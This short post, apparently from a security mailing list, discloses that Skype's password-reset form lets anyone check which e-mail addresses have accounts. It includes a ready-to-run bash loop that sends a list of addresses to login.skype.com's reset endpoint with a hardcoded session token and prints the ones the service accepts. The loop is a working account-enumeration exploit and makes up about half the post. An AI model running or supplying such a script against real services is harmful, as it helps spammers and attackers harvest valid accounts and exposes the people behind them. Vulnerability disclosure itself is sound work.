Well, they also seem to be vulnerable to oracle attacks against the
e-mail database through the same forgotten password form so I wouldn't
be surprised if an spammer has already been exploiting this.

Below is the classical bash script to exploit it, just input a newline
separated list of e-mails and it will send the request and filter those
which are clearly not in the database:
$ while read mail trash; do curl
'https://login.skype.com/account/password-reset-request' -s -o- -b
"skype-session-token=336ff76c68bf17b54eb0d2dc81f8bd6f1500a7fd" -d
"email=$mail&session_token=336ff76c68bf17b54eb0d2dc81f8bd6f1500a7fd" |
fgrep "The email address you entered is invalid." > /dev/null || echo
$mail; done
